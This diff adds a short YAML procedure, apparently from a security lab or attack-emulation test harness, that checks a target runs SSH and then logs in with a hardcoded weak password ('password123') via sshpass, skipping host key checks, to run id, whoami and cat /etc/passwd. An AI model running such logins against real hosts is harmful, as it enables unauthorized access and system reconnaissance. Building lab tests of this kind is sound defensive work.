@@ -1,0 +1,21 @@
+procedure:
+- action:
+    command: service ssh status || service sshd status || pgrep sshd
+    type: exec_target
+  expect:
+    exit_code: 0
+  outputs: {}
+  session: null
+  step_id: verify_ssh_running
+  timeout: 10
+- action:
+    command: sshpass -p 'password123' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10
+      appuser@${target_host} 'id && whoami && cat /etc/passwd'
+    type: exec_attacker
+  expect:
+    stdout_contains: uid=1001(appuser) gid=1001(appuser) groups=1001(appuser)
+  outputs: {}
+  session: null
+  step_id: exploit_weak_credentials
+  timeout: 30
+sessions: []
